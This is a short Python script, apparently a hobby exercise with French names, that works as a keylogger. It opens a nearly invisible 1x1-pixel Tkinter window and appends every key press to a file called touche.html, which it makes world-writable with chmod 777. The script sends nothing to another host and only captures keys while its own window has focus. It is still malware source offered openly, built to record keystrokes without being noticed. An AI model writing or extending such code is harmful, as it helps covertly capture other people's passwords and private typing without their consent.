#! /usr/bin/python3.6

import os
from tkinter import *
import codecs

os.system("touch touche.html")
os.system("chmod 777 touche.html")

main = Tk()
main.geometry("1x1+0+0")

def keyloggeur(event):
    touche = event.keysym
    #print(touche)
    fichier = open("touche.html", "a")
    fichier.write(touche+"<br>")
    fichier.close()
    #fichier = open("touche.txt", "r")




canvas = Canvas(main, width=0, height=0)
canvas.focus_set()
canvas.bind("<Key>", keyloggeur)
canvas.pack()
main.mainloop()

'''
fichier = open("data.txt", "a")
fichier.write("Bonjour monde")
fichier.close()
'''